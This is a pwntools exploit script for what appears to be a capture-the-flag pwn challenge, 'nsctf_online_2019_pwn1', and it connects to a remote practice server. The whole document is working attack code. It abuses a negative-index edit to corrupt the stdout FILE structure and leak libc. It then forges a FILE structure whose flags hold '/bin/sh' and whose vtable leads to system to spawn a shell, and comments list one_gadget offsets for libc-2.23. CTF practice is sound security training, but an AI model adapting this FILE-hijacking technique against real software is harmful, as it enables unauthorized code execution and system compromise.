from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./nsctf_online_2019_pwn1")
io=remote("node4.buuoj.cn", 27333)
elf=ELF("./nsctf_online_2019_pwn1")
libc=ELF("./libc-2.23.so")

def add(n,cc):
    io.sendlineafter(b"exit\n",b"1")
    io.sendlineafter(b"size:\n",str(n))
    io.sendafter(b"content:\n",cc)

def delete(n):
    io.sendlineafter(b"exit\n",b"2")
    io.sendafter(b"index:\n",str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b"exit\n",b"4")
    io.sendlineafter(b"index:\n",str(n))
    io.sendlineafter(b"size:\n",str(s))
    io.sendafter(b"content:\n",cc)

# gdb.attach(io)
# pause()

add(0x100,b"aaa")

payload=p64(0xfbad1887)+p64(0)*3+b"\x00"
edit(-0x10,len(payload),payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("leak_addr: "+hex(leak_addr))
libc_base=leak_addr-libc.sym[b"_IO_file_jumps"]
print("libc_base: "+hex(libc_base))

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+libc_base
sys_addr=libc.sym[b"system"]+libc_base
_IO_2_1_stdout=leak_addr+0x1f40


fs=FileStructure()
fs.flags=b"/bin/sh\x00"
fs.vtable=p64(_IO_2_1_stdout+0x10)
fs._IO_save_base=p64(sys_addr)
fs._lock=p64(libc_base+0x3c6780)


edit(-0x10,len(fs),bytes(fs))

io.interactive()

# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
